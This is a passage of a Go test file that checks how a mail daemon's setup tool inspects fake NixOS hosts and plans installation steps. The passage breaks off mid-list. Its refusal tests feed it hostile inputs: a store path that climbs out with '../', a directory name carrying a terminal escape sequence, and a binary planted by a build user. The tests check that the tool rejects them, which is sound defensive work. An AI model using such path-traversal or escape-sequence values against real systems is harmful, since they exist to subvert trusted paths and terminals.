package setup

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io/fs"
	"slices"
	"strings"
	"testing"

	"github.com/yaklabco/chainmail/internal/provider"
	"github.com/yaklabco/chainmail/internal/setup/setuptest"
	"github.com/yaklabco/chainmail/internal/setup/system"
)

// The NixOS host fakes: the --nix-dir the CLI resolved, the unit file and
// daemon binary the module put in the store, and the ids the module gave
// the daemon user and the store's group.
const (
	testNixDir     = "/home/alice/chainmail-nixos"
	storeFragment  = "/nix/store/x-unit/chainmail.service"
	storeBinary    = "/nix/store/x-chainmail/bin/chainmail"
	nixDaemonUID   = 991
	nixDaemonGID   = 992
	nixClientsGID  = 993
	nixbldGID      = 30000
	freshStepOne   = "Move /home/alice/chainmail-nixos into your NixOS configuration (for example /etc/nixos, or your flake's repository), then add the chainmail flake input and import the files:"
	wantRebuild    = "Rebuild the system the way you normally do, for example\n  sudo nixos-rebuild switch"
	rerunStepIntro = "Run bootstrap again to store the password and test the login:\n  chainmail bootstrap "
)

// bobGmail is a second account, for configs that do not hold alice.
var bobGmail = AccountSpec{Name: "bob", Provider: "gmail", Address: "bob@gmail.com", Auth: provider.AuthPassword}

// aliceWorkspace and bobWorkspace are OAuth accounts on the client google.
var (
	aliceWorkspace = AccountSpec{
		Name: "alice", Provider: "google-workspace", Address: "alice@example.com",
		Auth: provider.AuthOAuth2, OAuthClient: "google",
	}
	bobWorkspace = AccountSpec{
		Name: "bob", Provider: "google-workspace", Address: "bob@example.com",
		Auth: provider.AuthOAuth2, OAuthClient: "google",
	}
	workspaceClient = &OAuthClientSpec{Name: "google", ClientID: workspaceClientID}
)

// nixHost is a fake NixOS machine: files, users and groups, and systemd's
// view of chainmail.service.
type nixHost struct {
	files    *setuptest.Files
	accounts *setuptest.Accounts
	units    *setuptest.Units
}

// freshNixHost is a NixOS machine with no chainmail on it and one login
// user, alice. The store is root:nixbld 1775, as on a real host.
func freshNixHost() nixHost {
	h := setuptest.FreshHost("linux")
	h.Files.File(nixosMarker, 0, 0, 0o644, nil).
		Dir("/nix", 0, 0, 0o755).
		Dir(NixStore, 0, nixbldGID, fs.ModeSticky|0o775)
	return nixHost{files: h.Files, accounts: h.Accounts, units: &setuptest.Units{}}
}

// moduleNixHost is a NixOS machine whose configuration imports the
// chainmail module, rendering config into /etc/chainmail/config.toml. The
// unit is loaded from the store and active, as on incus.
func moduleNixHost(config []byte) nixHost {
	h := freshNixHost()
	l := LayoutFor(NixOS)
	h.files.Dir("/nix/store/x-unit", 0, 0, 0o555).
		File(storeFragment, 0, 0, 0o444, []byte("[Unit]\n")).
		Dir("/nix/store/x-chainmail", 0, 0, 0o555).
		Dir("/nix/store/x-chainmail/bin", 0, 0, 0o555).
		File(storeBinary, 0, 0, 0o555, []byte("chainmail from the store")).
		Dir(l.ConfigDir, 0, 0, 0o755).
		File(l.Config, 0, 0, 0o444, config).
		Dir(l.StateDir, nixDaemonUID, nixDaemonGID, 0o700).
		File(l.Vault, nixDaemonUID, nixDaemonGID, 0o600, []byte("vault"))
	h.accounts.AddUser(system.User{
		Name: l.DaemonUser, UID: nixDaemonUID, GID: nixDaemonGID,
		Home: "/var/empty", Shell: "/run/current-system/sw/bin/nologin",
	})
	h.accounts.AddGroup(system.GroupInfo{Name: l.DaemonUser, GID: nixDaemonGID})
	h.accounts.AddGroup(system.GroupInfo{Name: l.ClientGroup, GID: nixClientsGID, Members: []string{"alice"}})
	h.units.Info = system.UnitInfo{Loaded: true, Fragment: storeFragment, ExecPath: storeBinary, Active: true}
	return h
}

// moduleConfig is the config.toml the module renders for spec and client.
func moduleConfig(spec AccountSpec, client *OAuthClientSpec) []byte {
	return NewConfig(LayoutFor(NixOS), spec, client)
}

// inspect runs InspectNixOS on h for alice and fails the test on error.
func (h nixHost) inspect(t *testing.T) NixCurrent {
	t.Helper()
	cur, err := InspectNixOS(context.Background(), LayoutFor(NixOS), h.files, h.accounts, h.units, "alice")
	if err != nil {
		t.Fatalf("InspectNixOS: %v", err)
	}
	return cur
}

// nixRequest is gmailRequest with the --nix-dir the CLI resolved.
func nixRequest() Request {
	r := gmailRequest()
	r.NixDir = testNixDir
	return r
}

// nixWorkspaceRequest is workspaceRequest with the --nix-dir.
func nixWorkspaceRequest(terminal bool) Request {
	r := workspaceRequest(terminal)
	r.NixDir = testNixDir
	return r
}

func mustBuildNixOS(t *testing.T, cur NixCurrent, req Request) Plan {
	t.Helper()
	p, err := BuildNixOS(LayoutFor(NixOS), cur, req)
	if err != nil {
		t.Fatalf("BuildNixOS: %v", err)
	}
	return p
}

func TestInspectNixOS(t *testing.T) {
	t.Parallel()
	l := LayoutFor(NixOS)

	t.Run("no chainmail", func(t *testing.T) {
		t.Parallel()
		cur := freshNixHost().inspect(t)
		if cur.ModuleInstalled() {
			t.Error("ModuleInstalled() = true on a host without chainmail")
		}
		if cur.Unit != (system.UnitInfo{}) || cur.DaemonUser != nil || cur.Config != nil ||
			cur.VaultExists || cur.Health != nil {
			t.Errorf("got %+v, want everything nil or false", cur)
		}
		if cur.InvokingUser.Name != "alice" || cur.InvokingUser.UID != fakeUserUID {
			t.Errorf("InvokingUser = %+v, want alice", cur.InvokingUser)
		}
	})

	t.Run("module installed", func(t *testing.T) {
		t.Parallel()
		h := moduleNixHost(moduleConfig(aliceGmail, nil))
		cur := h.inspect(t)
		if !cur.ModuleInstalled() {
			t.Error("ModuleInstalled() = false with the unit loaded from the store")
		}
		want := system.UnitInfo{Loaded: true, Fragment: storeFragment, ExecPath: storeBinary, Active: true}
		if cur.Unit != want {
			t.Errorf("Unit = %+v, want %+v", cur.Unit, want)
		}
		if cur.DaemonUser == nil || cur.DaemonUser.Name != l.DaemonUser || cur.DaemonUser.UID != nixDaemonUID {
			t.Errorf("DaemonUser = %+v, want chainmail", cur.DaemonUser)
		}
		if !bytes.Equal(cur.Config, moduleConfig(aliceGmail, nil)) {
			t.Errorf("Config = %q, want the module's config", cur.Config)
		}
		if !cur.VaultExists {
			t.Error("VaultExists = false")
		}
		if cur.Health != nil {
			t.Errorf("Health = %+v, want nil: the CLI fills it in", cur.Health)
		}
		if calls := h.units.Calls(); !slices.Equal(calls, []string{"show chainmail.service"}) {
			t.Errorf("Units calls = %q, want one show of chainmail.service", calls)
		}
	})

	t.Run("config linked into the store", func(t *testing.T) {
		t.Parallel()
		h := moduleNixHost(nil)
		data := moduleConfig(aliceGmail, nil)
		h.files.Dir("/etc/static", 0, 0, 0o755).
			Dir("/nix/store/x-etc", 0, 0, 0o555).
			Dir("/nix/store/x-etc/chainmail", 0, 0, 0o555).
			File("/nix/store/x-etc/chainmail/config.toml", 0, 0, 0o444, data).
			Symlink("/etc/static/chainmail", 0, "/nix/store/x-etc/chainmail").
			Symlink(l.Config, 0, "../static/chainmail/config.toml")
		cur := h.inspect(t)
		if !bytes.Equal(cur.Config, data) {
			t.Errorf("Config = %q, want the store file's bytes", cur.Config)
		}
	})

	t.Run("unit not from the store", func(t *testing.T) {
		t.Parallel()
		h := moduleNixHost(moduleConfig(aliceGmail, nil))
		h.units.Info.Fragment = "/etc/systemd/system/chainmail.service"
		if h.inspect(t).ModuleInstalled() {
			t.Error("ModuleInstalled() = true for a unit outside the store")
		}
	})

	t.Run("unit in the store but not loaded", func(t *testing.T) {
		t.Parallel()
		h := moduleNixHost(moduleConfig(aliceGmail, nil))
		h.units.Info.Loaded = false
		if h.inspect(t).ModuleInstalled() {
			t.Error("ModuleInstalled() = true for a unit that is not loaded")
		}
	})

	t.Run("vault the invoking user may not look at counts as missing", func(t *testing.T) {
		t.Parallel()
		h := freshNixHost()
		h.files.FailRead(l.Vault, fs.ErrPermission)
		if h.inspect(t).VaultExists {
			t.Error("VaultExists = true for a vault Lstat could not read")
		}
	})

	t.Run("other vault errors are errors", func(t *testing.T) {
		t.Parallel()
		h := freshNixHost()
		h.files.FailRead(l.Vault, fs.ErrInvalid)
		if _, err := InspectNixOS(context.Background(), l, h.files, h.accounts, h.units, "alice"); err == nil {
			t.Error("InspectNixOS succeeded with an unreadable vault")
		}
	})

	t.Run("unit errors are errors", func(t *testing.T) {
		t.Parallel()
		h := freshNixHost()
		h.units.Err = errors.New("systemctl failed")
		if _, err := InspectNixOS(context.Background(), l, h.files, h.accounts, h.units, "alice"); err == nil {
			t.Error("InspectNixOS succeeded when systemctl failed")
		}
	})

	t.Run("missing invoking user", func(t *testing.T) {
		t.Parallel()
		h := freshNixHost()
		if _, err := InspectNixOS(context.Background(), l, h.files, h.accounts, h.units, "mallory"); err == nil {
			t.Error("InspectNixOS succeeded for a user that does not exist")
		}
	})
}

// wantFreshSteps is the Fresh next steps for the gmail request.
var wantFreshSteps = []string{
	freshStepOne + "\n" +
		"  inputs.chainmail.url = \"github:yaklabco/chainmail\";\n" +
		"  modules = [ inputs.chainmail.nixosModules.default\n" +
		"              ./chainmail-nixos/chainmail.nix\n" +
		"              ./chainmail-nixos/chainmail-alice.nix ];",
	wantRebuild,
	rerunStepIntro + "alice@gmail.com",
}

func TestBuildNixOSFresh(t *testing.T) {
	t.Parallel()
	cur := freshNixHost().inspect(t)
	req := nixRequest()
	req.Backup = BackupShow
	p := mustBuildNixOS(t, cur, req)

	if p.Version != planVersion || p.Platform != NixOS || p.InvokingUser != "alice" {
		t.Errorf("Version %d Platform %q InvokingUser %q", p.Version, p.Platform, p.InvokingUser)
	}
	if p.NixState != NixFresh || p.NixDir != testNixDir || p.DaemonBinary != "" {
		t.Errorf("NixState %q NixDir %q DaemonBinary %q", p.NixState, p.NixDir, p.DaemonBinary)
	}
	if p.NeedSecret || p.ServiceChanged || !p.NeedsRoot() {
		t.Errorf("NeedSecret %v ServiceChanged %v NeedsRoot %v, want false false true", p.NeedSecret, p.ServiceChanged, p.NeedsRoot())
	}
	if p.Account != aliceGmail || p.OAuthClient != nil || p.SecretName != "accounts/alice" {
		t.Errorf("Account %+v OAuthClient %+v SecretName %q", p.Account, p.OAuthClient, p.SecretName)
	}
	if p.Backup != BackupShow {
		t.Errorf("Backup = %q, want the request's show", p.Backup)
	}
	want := []Action{
		{Kind: ActSealKey, Note: "seal a new vault key into /home/alice/chainmail-nixos/chainmail-vault-key.cred"},
		{Kind: ActWriteNix, Entry: "chainmail.nix", Data: RenderServiceNix("alice"), Note: "write /home/alice/chainmail-nixos/chainmail.nix"},
		{Kind: ActWriteNix, Entry: "chainmail-alice.nix", Data: RenderAccountNix(aliceGmail, nil), Note: "write /home/alice/chainmail-nixos/chainmail-alice.nix for account alice"},
	}
	if !slices.EqualFunc(p.Actions, want, sameAction) {
		t.Errorf("actions:\n got %+v\nwant %+v", p.Actions, want)
	}
	if !slices.Equal(p.NextSteps, wantFreshSteps) {
		t.Errorf("NextSteps:\n got %q\nwant %q", p.NextSteps, wantFreshSteps)
	}

	t.Run("backup none", func(t *testing.T) {
		t.Parallel()
		if p := mustBuildNixOS(t, cur, nixRequest()); p.Backup != BackupNone {
			t.Errorf("Backup = %q, want none", p.Backup)
		}
	})

	t.Run("oauth", func(t *testing.T) {
		t.Parallel()
		p := mustBuildNixOS(t, cur, nixWorkspaceRequest(true))
		a, _ := findNixFile(p, AccountNixFile("alice"))
		if !bytes.Equal(a.Data, RenderAccountNix(aliceWorkspace, workspaceClient)) {
			t.Errorf("account module:\n%s\nwant the one with the client", a.Data)
		}
		if p.NeedSecret || len(p.NextSteps) != 3 {
			t.Errorf("NeedSecret %v NextSteps %q", p.NeedSecret, p.NextSteps)
		}
	})

	t.Run("name override", func(t *testing.T) {
		t.Parallel()
		req := nixRequest()
		req.Name = "personal"
		p := mustBuildNixOS(t, cur, req)
		if _, ok := findNixFile(p, "chainmail-personal.nix"); !ok {
			t.Errorf("no chainmail-personal.nix in %q", describe(p.Actions))
		}
		if last := p.NextSteps[2]; last != rerunStepIntro+"alice@gmail.com --name personal" {
			t.Errorf("rerun step = %q, want it to pass --name", last)
		}
		if !strings.Contains(p.NextSteps[0], "./chainmail-nixos/chainmail-personal.nix ];") {
			t.Errorf("step 1 does not import the account's module:\n%s", p.NextSteps[0])
		}
	})

	t.Run("another nix dir", func(t *testing.T) {
		t.Parallel()
		req := nixRequest()
		req.NixDir = "/srv/nixos-config/mail"
		p := mustBuildNixOS(t, cur, req)
		if !strings.HasPrefix(p.NextSteps[0], "Move /srv/nixos-config/mail into") ||
			!strings.Contains(p.NextSteps[0], "./mail/chainmail.nix\n") {
			t.Errorf("step 1 does not use the directory's base name:\n%s", p.NextSteps[0])
		}
	})
}

// findNixFile returns the write-nix action for the file called name.
func findNixFile(p Plan, name string) (Action, bool) {
	for _, a := range p.Actions {
		if a.Kind == ActWriteNix && a.Entry == name {
			return a, true
		}
	}
	return Action{}, false
}

func TestBuildNixOSFreshReusesCred(t *testing.T) {
	t.Parallel()
	req := nixRequest()
	req.NixCred = []byte("sealed:existing")
	req.Backup = BackupShow // ignored: the key is reused
	p := mustBuildNixOS(t, freshNixHost().inspect(t), req)

	wantActions(t, p.Actions, []string{"check-cred", "write-nix chainmail.nix", "write-nix chainmail-alice.nix"})
	if a := p.Actions[0]; a.Note != "check that /home/alice/chainmail-nixos/chainmail-vault-key.cred decrypts on this host" {
		t.Errorf("check-cred note = %q", a.Note)
	}
	if _, ok := findAction(p, ActSealKey); ok {
		t.Error("plan seals a new key although NixDir holds one")
	}
	if p.Backup != BackupNone {
		t.Errorf("Backup = %q, want none when the key is reused", p.Backup)
	}
	if p.NixState != NixFresh || !p.NeedsRoot() || !slices.Equal(p.NextSteps, wantFreshSteps) {
		t.Errorf("NixState %q NeedsRoot %v NextSteps %q", p.NixState, p.NeedsRoot(), p.NextSteps)
	}

	t.Run("an empty credential is still checked", func(t *testing.T) {
		t.Parallel()
		req := nixRequest()
		req.NixCred = []byte{}
		p := mustBuildNixOS(t, freshNixHost().inspect(t), req)
		if p.Actions[0].Kind != ActCheckCred {
			t.Errorf("first action %s, want check-cred: an existing file is never overwritten", p.Actions[0].Kind)
		}
	})
}

// wantAddSteps is the Add next steps for the gmail request.
var wantAddSteps = []string{
	"Import ./chainmail-nixos/chainmail-alice.nix from your NixOS configuration, next to the chainmail module.",
	wantRebuild,
	rerunStepIntro + "alice@gmail.com",
}

func TestBuildNixOSAdd(t *testing.T) {
	t.Parallel()
	cur := moduleNixHost(moduleConfig(bobGmail, nil)).inspect(t)
	p := mustBuildNixOS(t, cur, nixRequest())

	want := []Action{
		{Kind: ActWriteNix, Entry: "chainmail-alice.nix", Data: RenderAccountNix(aliceGmail, nil), Note: "write /home/alice/chainmail-nixos/chainmail-alice.nix for account alice"},
	}
	if !slices.EqualFunc(p.Actions, want, sameAction) {
		t.Errorf("actions:\n got %+v\nwant %+v", p.Actions, want)
	}
	if p.NixState != NixAdd || p.NeedsRoot() || p.NeedSecret || p.ServiceChanged {
		t.Errorf("NixState %q NeedsRoot %v NeedSecret %v ServiceChanged %v", p.NixState, p.NeedsRoot(), p.NeedSecret, p.ServiceChanged)
	}
	if p.Backup != BackupNone || p.DaemonBinary != "" || p.NixDir != testNixDir {
		t.Errorf("Backup %q DaemonBinary %q NixDir %q", p.Backup, p.DaemonBinary, p.NixDir)
	}
	if !slices.Equal(p.NextSteps, wantAddSteps) {
		t.Errorf("NextSteps:\n got %q\nwant %q", p.NextSteps, wantAddSteps)
	}

	t.Run("oauth client already in the config", func(t *testing.T) {
		t.Parallel()
		cur := moduleNixHost(moduleConfig(bobWorkspace, workspaceClient)).inspect(t)
		for _, id := range []string{workspaceClientID, ""} {
			req := nixWorkspaceRequest(true)
			req.OAuthClientID = id
			p := mustBuildNixOS(t, cur, req)
			a, _ := findNixFile(p, AccountNixFile("alice"))
			if !bytes.Equal(a.Data, RenderAccountNix(aliceWorkspace, nil)) {
				t.Errorf("id %q: account module:\n%s\nwant it without oauth_clients", id, a.Data)
			}
			if bytes.Contains(a.Data, []byte("oauth_clients")) {
				t.Errorf("id %q: account module sets the client again", id)
			}
			if !sameClient(p.OAuthClient, workspaceClient) {
				t.Errorf("id %q: OAuthClient = %+v, want the config's", id, p.OAuthClient)
			}
		}
	})

	t.Run("new oauth client", func(t *testing.T) {
		t.Parallel()
		cur := moduleNixHost(moduleConfig(bobGmail, nil)).inspect(t)
		p := mustBuildNixOS(t, cur, nixWorkspaceRequest(true))
		a, _ := findNixFile(p, AccountNixFile("alice"))
		if !bytes.Equal(a.Data, RenderAccountNix(aliceWorkspace, workspaceClient)) {
			t.Errorf("account module:\n%s\nwant it with the client", a.Data)
		}
	})

	t.Run("module without a config", func(t *testing.T) {
		t.Parallel()
		h := moduleNixHost(nil)
		h.files.Remove(LayoutFor(NixOS).Config)
		if p := mustBuildNixOS(t, h.inspect(t), nixRequest()); p.NixState != NixAdd {
			t.Errorf("NixState = %q, want add", p.NixState)
		}
	})

	t.Run("unit not active", func(t *testing.T) {
		t.Parallel()
		h := moduleNixHost(moduleConfig(bobGmail, nil))
		h.units.Info.Active = false
		if p := mustBuildNixOS(t, h.inspect(t), nixRequest()); p.NixState != NixAdd {
			t.Errorf("NixState = %q, want add: writing a module needs no running daemon", p.NixState)
		}
	})
}

func TestBuildNixOSFinish(t *testing.T) {
	t.Parallel()
	cur := moduleNixHost(moduleConfig(aliceGmail, nil)).inspect(t)
	p := mustBuildNixOS(t, cur, nixRequest())

	wantActions(t, p.Actions, []string{"store-secret alice", "test-account alice"})
	if p.NixState != NixFinish || !p.NeedSecret || !p.NeedsRoot() || p.ServiceChanged {
		t.Errorf("NixState %q NeedSecret %v NeedsRoot %v ServiceChanged %v", p.NixState, p.NeedSecret, p.NeedsRoot(), p.ServiceChanged)
	}
	if p.DaemonBinary != storeBinary {
		t.Errorf("DaemonBinary = %q, want %q", p.DaemonBinary, storeBinary)
	}
	if p.SecretName != "accounts/alice" || p.Backup != BackupNone || len(p.NextSteps) != 0 {
		t.Errorf("SecretName %q Backup %q NextSteps %q", p.SecretName, p.Backup, p.NextSteps)
	}

	t.Run("healthy", func(t *testing.T) {
		t.Parallel()
		cur := moduleNixHost(moduleConfig(aliceGmail, nil)).inspect(t)
		cur.Health = okHealth
		p := mustBuildNixOS(t, cur, nixRequest())
		wantActions(t, p.Actions, []string{"test-account alice"})
		if p.NeedSecret || !p.NeedsRoot() {
			t.Errorf("NeedSecret %v NeedsRoot %v, want false true", p.NeedSecret, p.NeedsRoot())
		}
	})

	t.Run("oauth with a terminal", func(t *testing.T) {
		t.Parallel()
		cur := moduleNixHost(moduleConfig(aliceWorkspace, workspaceClient)).inspect(t)
		p := mustBuildNixOS(t, cur, nixWorkspaceRequest(true))
		wantActions(t, p.Actions, []string{"store-secret alice", "auth-login alice", "test-account alice"})
		if p.SecretName != "oauth_clients/google" || len(p.NextSteps) != 0 {
			t.Errorf("SecretName %q NextSteps %q", p.SecretName, p.NextSteps)
		}
	})

	t.Run("oauth without a terminal", func(t *testing.T) {
		t.Parallel()
		cur := moduleNixHost(moduleConfig(aliceWorkspace, workspaceClient)).inspect(t)
		p := mustBuildNixOS(t, cur, nixWorkspaceRequest(false))
		wantActions(t, p.Actions, []string{"store-secret alice"})
		if !slices.Equal(p.NextSteps, []string{"chainmail auth login alice"}) {
			t.Errorf("NextSteps = %q, want the login", p.NextSteps)
		}
	})

	t.Run("an existing credential in NixDir is ignored", func(t *testing.T) {
		t.Parallel()
		req := nixRequest()
		req.NixCred = []byte("sealed:existing")
		p := mustBuildNixOS(t, cur, req)
		wantActions(t, p.Actions, []string{"store-secret alice", "test-account alice"})
	})
}

func TestBuildNixOSRefusals(t *testing.T) {
	t.Parallel()
	l := LayoutFor(NixOS)
	cases := []struct {
		name string
		host func() nixHost
		req  func() Request
		edit func(cur *NixCurrent)
		want string
	}{
		{
			name: "vault without a module",
			host: func() nixHost {
				h := freshNixHost()
				h.files.Dir(l.StateDir, nixDaemonUID, nixDaemonGID, 0o700).
					File(l.Vault, nixDaemonUID, nixDaemonGID, 0o600, []byte("vault"))
				return h
			},
			want: "the vault /var/lib/chainmail/vault.age exists but there is no chainmail module to open it",
		},
		{
			name: "daemon user without a module",
			host: func() nixHost {
				h := freshNixHost()
				h.accounts.AddUser(system.User{Name: "chainmail", UID: nixDaemonUID, GID: nixDaemonGID})
				return h
			},
			want: "chainmail is set up on this NixOS host, but not by the NixOS module",
		},
		{
			name: "config without a module",
			host: func() nixHost {
				h := freshNixHost()
				h.files.Dir(l.ConfigDir, 0, 0, 0o755).File(l.Config, 0, 0, 0o644, moduleConfig(aliceGmail, nil))
				return h
			},
			want: "chainmail is set up on this NixOS host, but not by the NixOS module",
		},
		{
			name: "unit not from the store",
			host: func() nixHost {
				h := freshNixHost()
				h.units.Info = system.UnitInfo{Loaded: true, Fragment: "/etc/systemd/system/chainmail.service", ExecPath: "/usr/local/libexec/chainmail/chainmail", Active: true}
				return h
			},
			want: "chainmail is set up on this NixOS host, but not by the NixOS module",
		},
		{
			name: "finish with the unit not active",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.units.Info.Active = false
				return h
			},
			want: "chainmail.service is not active",
		},
		{
			name: "finish with the binary outside the store",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.units.Info.ExecPath = "/home/alice/bin/chainmail"
				return h
			},
			want: "is not in the Nix store",
		},
		{
			name: "finish without an exec path",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.units.Info.ExecPath = ""
				return h
			},
			want: "is not in the Nix store",
		},
		{
			name: "finish with an exec path climbing out of the store",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.units.Info.ExecPath = "/nix/store/../../home/alice/chainmail"
				return h
			},
			want: "is not in the Nix store",
		},
		{
			name: "finish with the binary missing from the store",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.files.Remove(storeBinary)
				return h
			},
			want: "is not a regular file",
		},
		{
			name: "finish with the binary's store path missing",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.units.Info.ExecPath = "/nix/store/y-missing/bin/chainmail"
				return h
			},
			want: "is not a regular file",
		},
		{
			name: "finish with the binary a symlink",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.files.Symlink(storeBinary, 0, "/home/alice/chainmail")
				return h
			},
			want: "is not a regular file",
		},
		{
			name: "finish with the binary a directory",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.files.Dir(storeBinary, 0, 0, 0o555)
				return h
			},
			want: "is not a regular file",
		},
		{
			name: "finish with a group-writable store entry",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.files.Dir("/nix/store/x-chainmail", 0, nixbldGID, 0o775)
				return h
			},
			want: "unsafe path /nix/store/x-chainmail: writable by group or others",
		},
		{
			name: "finish with a binary a build user owns",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.files.File(storeBinary, 30001, nixbldGID, 0o555, []byte("evil"))
				return h
			},
			want: "unsafe path " + storeBinary + ": owned by uid 30001",
		},
		{
			name: "fresh with an untrusted lock directory",
			host: func() nixHost {
				h := freshNixHost()
				h.files.Dir("/run", 1000, 1000, 0o755)
				return h
			},
			want: "unsafe path /run: owned by uid 1000",
		},
		{
			name: "finish with an untrusted lock directory",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.files.Dir("/run", 0, 0, 0o777)
				return h
			},
			want: "unsafe path /run: writable by group or others",
		},
		{
			name: "finish without the daemon user",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.accounts = setuptest.FreshHost("linux").Accounts
				return h
			},
			want: "the user chainmail does not exist",
		},
		{
			name: "finish with a daemon user that is root",
			host: func() nixHost {
				h := moduleNixHost(moduleConfig(aliceGmail, nil))
				h.accounts.AddUser(system.User{Name: "chainmail", UID: 0, GID: 0})
				return h
			},
			want: "must not be root",
		},
		{
			name: "account with another address",
			host: func() nixHost { return moduleNixHost(moduleConfig(aliceGmail, nil)) },
			req: func() Request {
				r := nixRequest()
				r.Address = "alice@googlemail.com"
				return r
			},
			want: "another address",
		},
		{
			name: "account with another provider",
			host: func() nixHost { return moduleNixHost(moduleConfig(aliceGmail, nil)) },
			req: func() Request {
				r := nixRequest()
				r.Detection = Detection{Provider: "hostinger", Auth: provider.AuthPassword}
				return r
			},
			want: "uses provider gmail, not hostinger",
		},
		{
			name: "add with an oauth client of another id",
			host: func() nixHost { return moduleNixHost(moduleConfig(bobWorkspace, workspaceClient)) },
			req: func() Request {
				r := nixWorkspaceRequest(true)
				r.OAuthClientID = "other.apps.googleusercontent.com"
				return r
			},
			want: "already exists in the config with another client ID",
		},
		{
			name: "fresh oauth without a client id",
			host: freshNixHost,
			req: func() Request {
				r := nixWorkspaceRequest(true)
				r.OAuthClientID = ""
				return r
			},
			want: "needs an OAuth client ID",
		},
		{
			name: "config that does not parse",
			host: func() nixHost { return moduleNixHost([]byte("[[[")) },
			want: "the config /etc/chainmail/config.toml does not parse",
		},
		{
			name: "invoking user root",
			host: freshNixHost,
			edit: func(cur *NixCurrent) { cur.InvokingUser = system.User{Name: "root", UID: 0} },
			want: "must not run as root",
		},
		{
			name: "invoking user chainmail",
			host: func() nixHost { return moduleNixHost(moduleConfig(aliceGmail, nil)) },
			edit: func(cur *NixCurrent) { cur.InvokingUser = *cur.DaemonUser },
			want: "must not run as the daemon user chainmail",
		},
		{
			name: "invalid account name",
			host: freshNixHost,
			req: func() Request {
				r := nixRequest()
				r.Name = "Not Valid"
				return r
			},
			want: "invalid account name",
		},
		{
			name: "malformed binary hash",
			host: freshNixHost,
			req: func() Request {
				r := nixRequest()
				r.ExecSHA256 = "x"
				return r
			},
			want: "SHA-256",
		},
		{
			name: "backup show without a terminal",
			host: freshNixHost,
			req: func() Request {
				r := nixRequest()
				r.Backup = BackupShow
				r.Terminal = false
				return r
			},
			want: "--key-backup show needs a terminal",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			cur := tc.host().inspect(t)
			if tc.edit != nil {
				tc.edit(&cur)
			}
			req := nixRequest()
			if tc.req != nil {
				req = tc.req()
			}
			_, err := BuildNixOS(l, cur, req)
			r := asRefusal(t, err)
			if !strings.Contains(r.Msg, tc.want) {
				t.Errorf("refusal %q does not contain %q", r.Msg, tc.want)
			}
			if r.Hint == "" {
				t.Errorf("refusal %q has no hint", r.Msg)
			}
		})
	}

	t.Run("not active hint", func(t *testing.T) {
		t.Parallel()
		h := moduleNixHost(moduleConfig(aliceGmail, nil))
		h.units.Info.Active = false
		_, err := BuildNixOS(l, h.inspect(t), nixRequest())
		if r := asRefusal(t, err); r.Hint != "check it with: journalctl -u chainmail" {
			t.Errorf("hint = %q", r.Hint)
		}
	})

	t.Run("config that does not parse hint", func(t *testing.T) {
		t.Parallel()
		_, err := BuildNixOS(l, moduleNixHost([]byte("[[[")).inspect(t), nixRequest())
		if r := asRefusal(t, err); !strings.HasPrefix(r.Hint, "fix the config in your NixOS configuration so it parses") {
			t.Errorf("hint = %q", r.Hint)
		}
	})

	t.Run("backup show without a terminal is fine when the key is reused", func(t *testing.T) {
		t.Parallel()
		req := nixRequest()
		req.Backup, req.Terminal, req.NixCred = BackupShow, false, []byte("sealed:x")
		mustBuildNixOS(t, freshNixHost().inspect(t), req)
	})

	for _, dir := range []string{"", "chainmail-nixos", "./chainmail-nixos", "/home/alice/../alice/chainmail-nixos", "/home/alice/x\x1b]0;y"} {
		t.Run("nix dir "+strings.ToValidUTF8(dir, "?"), func(t *testing.T) {
			t.Parallel()
			req := nixRequest()
			req.NixDir = dir
			_, err := BuildNixOS(l, freshNixHost().inspect(t), req)
			var r *Refusal
			if err == nil || errors.As(err, &r) {
				t.Errorf("BuildNixOS with NixDir %q: %v, want a plain error", dir, err)
			}
		})
	}

	t.Run("not inspected", func(t *testing.T) {
		t.Parallel()
		cur := NixCurrent{InvokingUser: system.User{Name: "alice", UID: fakeUserUID}}
		if _, err := BuildNixOS(l, cur, nixRequest()); err == nil {
			t.Error("BuildNixOS accepted a NixCurrent InspectNixOS did not make")
		}
	})

	t.Run("another layout", func(t *testing.T) {
		t.Parallel()
		if _, err := BuildNixOS(LayoutFor(Linux), freshNixHost().inspect(t), nixRequest()); err == nil {
			t.Error("BuildNixOS accepted the Linux layout")
		}
	})
}

// nixPlanCase is a NixOS plan from the tests above.
type nixPlanCase struct {
	name  string
	build func(t *testing.T) Plan
}

// nixPlans builds a plan in every state and branch.
func nixPlans() []nixPlanCase {
	withReq := func(h func() nixHost, req func() Request, health *AccountHealth) func(t *testing.T) Plan {
		return func(t *testing.T) Plan {
			cur := h().inspect(t)
			cur.Health = health
			return mustBuildNixOS(t, cur, req())
		}
	}
	finishHost := func() nixHost { return moduleNixHost(moduleConfig(aliceGmail, nil)) }
	finishOAuthHost := func() nixHost { return moduleNixHost(moduleConfig(aliceWorkspace, workspaceClient)) }
	return []nixPlanCase{
		{"fresh", withReq(freshNixHost, nixRequest, nil)},
		{"fresh backup show", withReq(freshNixHost, func() Request {
			r := nixRequest()
			r.Backup = BackupShow
			return r
		}, nil)},
		{"fresh reusing the credential", withReq(freshNixHost, func() Request {
			r := nixRequest()
			r.NixCred = []byte("sealed:x")
			return r
		}, nil)},
		{"fresh oauth", withReq(freshNixHost, func() Request { return nixWorkspaceRequest(true) }, nil)},
		{"fresh name override", withReq(freshNixHost, func() Request {
			r := nixRequest()
			r.Name = "personal"
			return r
		}, nil)},
		{"add", withReq(func() nixHost { return moduleNixHost(moduleConfig(bobGmail, nil)) }, nixRequest, nil)},
